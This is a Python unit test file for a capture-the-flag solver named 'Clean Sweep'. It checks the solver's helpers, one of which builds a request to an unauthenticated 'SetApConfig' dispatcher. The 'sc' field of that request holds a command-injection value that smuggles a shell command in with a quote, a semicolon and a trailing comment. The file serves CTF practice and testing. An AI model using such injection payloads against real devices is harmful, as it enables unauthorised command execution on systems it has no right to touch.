#!/usr/bin/env python3
"""Unit tests for the Clean Sweep solver's pure helper functions."""

from __future__ import annotations

import importlib.util
from pathlib import Path


ROOT = Path(__file__).resolve().parents[1]
SPEC = importlib.util.spec_from_file_location("clean_sweep_solver", ROOT / "solver" / "solve.py")
assert SPEC is not None and SPEC.loader is not None
MODULE = importlib.util.module_from_spec(SPEC)
SPEC.loader.exec_module(MODULE)


def test_build_payload_uses_the_unauthenticated_reqdo_dispatcher():
    payload = MODULE.build_payload("printf TEST_MARKER")

    assert payload["td"] == "SetApConfig"
    assert payload["s"] == ""
    assert payload["p"] == ""
    assert payload["sc"] == '"; printf TEST_MARKER; #'


def test_extract_flag_ignores_cgi_noise():
    output = b"HTTP/1.0 200 OK\r\n\nNNS{unit_test_flag}\n\r\n"

    assert MODULE.extract_flag(output) == "NNS{unit_test_flag}"
